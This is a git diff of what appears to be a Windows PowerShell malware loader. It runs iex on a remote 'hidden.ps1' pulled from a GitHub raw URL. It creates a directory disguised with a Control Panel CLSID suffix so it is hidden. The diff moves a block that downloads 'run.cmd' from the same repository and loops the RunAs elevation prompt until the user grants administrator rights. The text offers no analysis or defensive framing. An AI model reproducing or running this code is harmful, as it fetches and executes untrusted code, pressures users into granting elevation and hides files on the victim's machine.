@@ -1,6 +1,12 @@
 $skid = "skid"
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
 
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$env:userprofile\run.cmd"
+    
+    while(1){try{Start-Process -Verb RunAs -FilePath '$env:userprofile\run.cmd';exit}catch{}}
+}
+
 $rdir = "$env:userprofile\150F4013"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 New-Item -ItemType Directory -Path $dir
@@ -10,12 +16,6 @@ $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
 
 
-
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
-    
-    while(1){try{Start-Process -Verb RunAs -FilePath '$temp\run.cmd';exit}catch{}}
-}
 
 
 
